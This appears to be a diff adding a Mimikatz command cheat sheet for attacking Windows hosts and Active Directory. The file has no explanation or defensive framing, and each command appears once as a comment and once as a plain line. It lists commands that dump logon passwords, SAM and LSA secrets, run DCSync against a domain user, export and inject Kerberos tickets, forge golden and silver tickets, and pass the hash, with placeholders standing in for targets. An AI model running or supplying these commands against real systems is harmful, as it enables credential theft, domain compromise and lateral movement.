@@ -1,0 +1,38 @@
+# privilege::debug                                                                                                                                                           │
+privilege::debug                                                                                                                                                           │
+
+# token::elevate                                                                                                                                                             │
+token::elevate                                                                                                                                                             │
+
+# sekurlsa::logonpasswords                                                                                                                                                   │
+sekurlsa::logonpasswords                                                                                                                                                   │
+
+# sekurlsa::tickets /export                                                                                                                                                  │
+sekurlsa::tickets /export                                                                                                                                                  │
+
+# lsadump::sam                                                                                                                                                               │
+lsadump::sam                                                                                                                                                               │
+
+# lsadump::dcsync /user:DOMAIN\USERNAME                                                                                                                                      │
+lsadump::dcsync /user:DOMAIN\USERNAME                                                                                                                                      │
+
+# lsadump::lsa /patch                                                                                                                                                        │
+lsadump::lsa /patch                                                                                                                                                        │
+
+# kerberos::golden /domain:DOMAIN /sid:DOMAIN_SID /ptt /target:IP /service:SPN /rc4:NTLM /user:USERNAME                                                                      │
+kerberos::golden /domain:DOMAIN /sid:DOMAIN_SID /ptt /target:IP /service:SPN /rc4:NTLM /user:USERNAME                                                                      │
+
+# kerberos::golden /domain:DOMAIN /sid:DOMAIN_SID /ptt /krbrgt:NTLM                                                                                                          │
+kerberos::golden /domain:DOMAIN /sid:DOMAIN_SID /ptt /krbrgt:NTLM                                                                                                          │
+
+# sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:NTLM /run:COMMAND                                                                                                        │
+sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:NTLM /run:COMMAND                                                                                                        │
+
+# kerberos::ptt \path\to\kirbi                                                                                                                                               │
+kerberos::ptt \path\to\kirbi                                                                                                                                               │
+
+# kerberos::purge                                                                                                                                                            │
+kerberos::purge                                                                                                                                                            │
+
+# misc::cmd                                                                                                                                                                  │
+misc::cmd                                                                                                                                                                  │
